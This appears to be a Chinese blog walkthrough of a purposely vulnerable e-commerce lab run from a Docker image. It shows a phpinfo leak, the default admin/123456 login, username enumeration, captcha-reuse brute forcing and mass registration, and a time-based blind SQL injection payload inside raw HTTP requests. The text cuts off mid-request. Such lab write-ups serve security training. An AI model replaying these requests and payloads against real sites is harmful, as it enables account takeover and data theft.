---
title: 实战 | shop靶场
url: https://mp.weixin.qq.com/s/b7KzFiPqUCKEKdyWu7Q7UA
source: Doonsec's feed
date: 2026-04-06
fetch_date: 2026-04-07T04:27:50.154719
---

# 实战 | shop靶场

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/bhDuGkpteXu05eUSlbhqibkNS7qTOgs8x1Zm9EZ2wicGicXLMrJmTFozRgxzFThDDUQdEKun6vz7D0xmKicdhd5m8iaIhkj8SMaaEFQVehyYm0iak/0?wx_fmt=jpeg)

# 实战 | shop靶场

原创

web安全小白
web安全小白

web安全小白

![]()

在小说阅读器中沉浸阅读

## 靶场安装

```
docker pull docker.io/zksmile/vul
docker run -d -p 7777:80 --name shop zksmile/vul:secshop_v2
```

## 信息泄露

这里我直接通过kali自带的目录扫描工具，发现了网站的后台地址，以及泄露的phpinfo页面

![](https://mmbiz.qpic.cn/sz_mmbiz_png/bhDuGkpteXvFP2MndWNZG8UClaDfhvF5y9DNtvxeRNFvEBGwwJmXbAATiaoJNk5Gx0duZ7n9Av3oRdKoic2bvSicKux4T6dB7aLMphCWK3kMwQ/640?wx_fmt=png&from=appmsg)

http://103.194.106.127:7777/phpinfo.php

![](https://mmbiz.qpic.cn/sz_mmbiz_png/bhDuGkpteXsgJKKXIeQBv6rQ2k34yzQahKTDfmMYVUN3WpUfsOwfDA5UoCtVYoawe8wuGHTnAPUcuoDQrKT7u3Tf0yy5U0nCBzvfeJ0icSxo/640?wx_fmt=png&from=appmsg)

## 后台弱口令

账号：admin

密码：123456

http://103.194.106.127:7777/index.php?m=Admin&c=Index&a=toLogin

![](https://mmbiz.qpic.cn/sz_mmbiz_png/bhDuGkpteXsyapf4SIk3St5fD5BL8ar1M48EmdYu9Ic6mS9dOHmV79u9ibaJeew6RcFGLBBQbcsDLNu84ty5svWYlOPVKx0QvBt2ic22f5Miaw/640?wx_fmt=png&from=appmsg)

密码输入错误时的返回包![](https://mmbiz.qpic.cn/sz_mmbiz_png/bhDuGkpteXve6aE1KURVsvs961WicxD8ibiaS1oNCvG7a3mCzb6lCQ1XPwf6b2N31Q3X66BKh5x67fQLSqmEeha7rPsBwLROsy70Qx1xWWL0oA/640?wx_fmt=png&from=appmsg)

密码输入正确时的返回包

![](https://mmbiz.qpic.cn/mmbiz_png/bhDuGkpteXvicJHNNQgaHcNJ3aTG1rX5kSLONCQ6qq8uMQz4xu17XmDRyias9bfE7LAFY0AhH71rGJvV0DPnUhxXqmIgAXX3ZjSHHyxSu9Ucw/640?wx_fmt=png&from=appmsg)

所以该登录口也存在验证码复用导致的密码可爆破

## 用户名枚举

注册时输入用户名，发现网页会对其进行判断，该用户是否已经存在

![](https://mmbiz.qpic.cn/sz_mmbiz_png/bhDuGkpteXttRoeFKIRE0EqBoET2HLDLxoKCaUMhGYh0Lc8IicqSHMDicMoqAHn3O9zgRy76xJ9g8HsIceINC2eTZ3Ak2WnIZwGcjf3HIvaFQ/640?wx_fmt=png&from=appmsg)

抓取验证数据包

```
POST /index.php?m=Home&c=Users&a=checkLoginKey HTTP/1.1
Host: 103.194.106.127:7777
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 35
Origin: http://103.194.106.127:7777
Connection: close
Referer: http://103.194.106.127:7777/index.php?m=Home&c=Users&a=regist
Cookie: PHPSESSID=8ib301drerg7hb42veeu6fedu1; areaId2=440100

loginName=websec&clientid=loginName
```

将用户名websec设置为变量爆破，最终可以通过回显长度的不同知道那些用户是存在的

![](https://mmbiz.qpic.cn/mmbiz_png/bhDuGkpteXtBjUzERJExmt4SSXtTibKyiameGMXXNxdpu77zEWicg10PN5BBYSLRIRoOnmMwqRHqryJKSn0xOG1eMGaVic6kSxr6ibLgd1FSqVSo/640?wx_fmt=png&from=appmsg)

## 验证码复用导致的任意用户注册

http://103.194.106.127:7777/index.php?m=Home&c=Users&a=regist

抓取用户注册时的数据包

![](https://mmbiz.qpic.cn/mmbiz_png/bhDuGkpteXuO1WrfgIpiczEjABKU6eTjyjicbpnMhO15QCXlV9OdLYL7XyIIwZXPoJ1W0jy7GO3hcwm41PjroKYat9U1VQLyQhMI7EwnkPMU0/640?wx_fmt=png&from=appmsg)

```
POST /index.php?m=Home&c=Users&a=toRegist HTTP/1.1
Host: 103.194.106.127:7777
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 117
Origin: http://103.194.106.127:7777
Connection: close
Referer: http://103.194.106.127:7777/index.php?m=Home&c=Users&a=regist
Cookie: areaId2=440100; loginName=web222; WSTMALLviewGoods=think%3A%5B%226%22%2C%225%22%2C%2212%22%2C%2211%22%2C%2212-1%22%2C%2227%22%5D; PHPSESSID=ub569i09gbnmbi9itrtivor0j2

loginName=qweqwe&loginPwd=web111&reUserPwd=123123&userEmail=&userPhone=&mobileCode=&verify=8eia&nameType=2&protocol=1
```

正常发送该数据包

![](https://mmbiz.qpic.cn/sz_mmbiz_png/bhDuGkpteXv5f7RvAVlgIRHZoElXF8Xp7kicuC4hibL7eSKqibOYKOSpBmze0XvHQ2qmQX8qptV5uiaiad1IEloVlcDvxibR8uMibXPDWzK1uw1icqA/640?wx_fmt=png&from=appmsg)

此时只修改用户名可以发现，用户依旧能够正常注册成功，由此可知该验证码存在复用的情况

![](https://mmbiz.qpic.cn/sz_mmbiz_png/bhDuGkpteXunoiaKw6ZtmOiaw0E1fLSceLDcsHXkibzBX0qlt4YNryRqmQ8vXXc03VGR1e2DgWbzPavNSsYzTlNIibFiaLkRq9pB3YkACQt2jUPY/640?wx_fmt=png&from=appmsg)

通过将用户名设置为变量，从而可以批量注册用户

## 验证码复用导致的密码可爆破

http://103.194.106.127:7777/index.php?m=Home&c=Users&a=login

抓取登录时的数据包

![](https://mmbiz.qpic.cn/mmbiz_png/bhDuGkpteXvNIZ7Rpe4gicCCwiaIfewoOE12p8VzScJmzFvfaib97VoYdLNktpAIOuFEbEO3IxibgXbKG09JxcSoQutTSmZDTu5iaBiavM3XCD3sM/640?wx_fmt=png&from=appmsg)

```
POST /index.php?m=Home&c=Users&a=checkLogin HTTP/1.1
Host: 103.194.106.127:7777
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 59
Origin: http://103.194.106.127:7777
Connection: close
Referer: http://103.194.106.127:7777/index.php?m=Home&c=Users&a=login
Cookie: PHPSESSID=8ib301drerg7hb42veeu6fedu1; areaId2=440100

loginName=websec&loginPwd=123123&verify=vgxw&rememberPwd=on
```

验证码不做改变时，输入的密码正确时回显如下

![](https://mmbiz.qpic.cn/mmbiz_png/bhDuGkpteXvZYPKWKsrVwjHwugOF2EMQONdJibdGIadg2tEmLlajRFdwuBThlpiaiaDP7TOQ8pgicZADtfKpZITo2yia7Vha4oreZv8RIqTp7JT4/640?wx_fmt=png&from=appmsg)

验证码不做改变时，密码错误时时回显如下

![](https://mmbiz.qpic.cn/sz_mmbiz_png/bhDuGkpteXtMvXQr74EiaqLBunTQRmUsMiaHYAeEZEOPLO21xGrnYI55exbMKuLicyr0z3XufkQZF62ovNEBMcBWcNKDQUnMWRBUicT3ewFYYLg/640?wx_fmt=png&from=appmsg)

通过测试可以发现验证码存在复用的情况，此时将账号，密码进行爆破，就可以找出网站存在弱口令的账号

![](https://mmbiz.qpic.cn/sz_mmbiz_png/bhDuGkpteXsPNz008ic8PLRYoyspK1YJdMQpgHrmShB89G08KcjkMXS2AicHdLFgQlQvF4J53onvRdI3ib7NMLA6usXll1ok6wibwCdzz7GxCpM/640?wx_fmt=png&from=appmsg)

## SQL注入

点击访问商城页面中任意商品

http://103.194.106.127:7777/index.php?m=Home&c=Goods&a=getGoodsDetails&goodsId=12

![](https://mmbiz.qpic.cn/mmbiz_png/bhDuGkpteXvLk2MXdXqfP57iaefg8KSj3vZDdoiafEOAZgsrbwk6tiaMibZp1OEqzy5He1rBzfOXVKx5EoaxJ7Y2OFY416tLzm3gj4X01ytJ0Sc/640?wx_fmt=png&from=appmsg)

```
GET /index.php?m=Home&c=Goods&a=getGoodsDetails&goodsId=5 HTTP/1.1
Host: 103.194.106.127:7777
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: areaId2=440100; loginName=web222; PHPSESSID=0j8v4hbag8m7452i70eihut5q5; loginPwd=NDA5NjBlN2UxOTYyNDM0MTBmZTk2YjU0N2Q1NmJmOWM%3D; WSTMALLviewGoods=think%3A%5B%226%22%2C%225%22%2C%2212%22%2C%2211%22%2C%2212-1%22%5D
Upgrade-Insecure-Requests: 1
```

此刻通过插件我们可知，goodsId参数值存在注入

![](https://mmbiz.qpic.cn/sz_mmbiz_png/bhDuGkpteXvGCanLa741dddqgmUB04oEq0zLATWiagJeWDm71mXfbSkQRpmooeTCHcRIBkNLWgnzboQqAs04gQE3PSaEurH8MZdvH9l5E0js/640?wx_fmt=png&from=appmsg)

该网站许多地方都存在SQL注入，你们只需要使用好插件，都能发现注入漏洞

漏洞验证时，可以采用手工注入也可以使用sqlmap

这里我通过if条件语句判断用户第一位的第一个值是多少，来验证漏洞的存在![](https://mmbiz.qpic.cn/sz_mmbiz_png/bhDuGkpteXv0vAichTJ5hdCDw6AHzUcwmVV1QklYLvKjFqiagyZIuHtViaDTaIXQxLF9AQfic2ibMYxJoIYxIwLibJ4ZXpqCPZibUyxLZx8Sc6lFho/640?wx_fmt=png&from=appmsg)

判断语句goodsId=12+and+if(substr((select+user()),1,1)='a',sleep(5),5)

```
GET /index.php?m=Home&c=Goods&a=getGoodsDetails&goodsId=10+and+if(substr((select+user()),1,1)='a',sleep(5),1) HTTP/1.1
Host: 103.194.106.127:7777
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://103.194.106.127:7777/index.php?m=Home&c=goods&a=getGoodsList&searchType=1&keyWords=1
Cookie: areaId2=440100; loginName=web222; WSTMALLviewGoods=think%3A%5B%226%22%2C%225%22%2C%2212%22%2C%2211%22%2C%2212-1%22%5D; PHPSESSID=ub569i09gbnmbi9itrtivor0j2; loginPwd=NDA5NjBlN2UxOTYyNDM0MTBmZTk2YjU0N2Q1NmJmOWM%3D
Upgrade-Insecure-Re...